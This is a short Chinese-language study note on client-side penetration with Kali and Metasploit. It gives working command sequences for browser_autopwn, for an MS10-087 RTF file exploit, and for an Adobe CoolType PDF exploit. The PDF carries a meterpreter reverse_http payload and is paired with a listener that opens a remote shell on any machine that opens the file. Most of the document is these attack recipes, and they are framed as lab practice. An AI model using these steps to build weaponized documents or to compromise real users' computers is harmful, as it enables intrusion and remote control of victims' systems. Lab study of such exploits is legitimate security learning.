# kali 客户端渗透学习

## 概述
* 个人电脑一般安装了个人防火墙和杀毒软件，很难使用网络服务渗透的方法
* 根据不同的环境特性选择不同的攻击技术
* 客户端渗透技术常常针对浏览器、office软件等
## 知名的漏洞
* JAVA 7 ,CVE-2012-4681，导致内嵌JRE的IE、FireFox、Chrome、Safari都受影响
* IE ,MS11-050
* Office ,MS10-087 

## 学习

### browser_autopwn

```
msf>search browser_autopwn
>use auxiliary/server/browser_autopwn
>set LHOST 10.10.10.128
>set SRVHOST 10.10.10.128
>set URIPATH auto
>run
```
* 注：等提示Server Started 之后（要一点时间）再使用浏览器访问url地址
http://10.10.10.128:8080/auto 之后将自动进行攻击

* 使用自动化攻击不一定都会成功，有可能导致浏览器崩溃，我在实验的过程中碰到xp失败和win7浏览器崩溃问题


### ms10-087 office漏洞

* 适用office 2002,2003,2007
```
msf>use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof 
>set payload windows/exec
>set CMD calc.exe
>set FILENAME test.rtf
>exploit
```
* 生成文件后，目标机点击该文件会执行calc.exe

### adobe_cooltype_sing漏洞
* 适用adobe 8.2.4~9.3.4
```
msf> use exploit/windows/fileformat/adobe_cooltype_sing
>set payload windows/meterpreter/reverse_http
>set LHOST 192.168.10.131
>set LPORT 8443
>set FILENAME 2.pdf
>run
```
* 生成PDF

```
msf>use exploit/multi/handler
>set payload windows/meterpreter/reverse_http
>set LHOST 192.168.10.131
>set LPORT 8443
>run
```
* 在目标电脑上打开PDF，就会溢出成功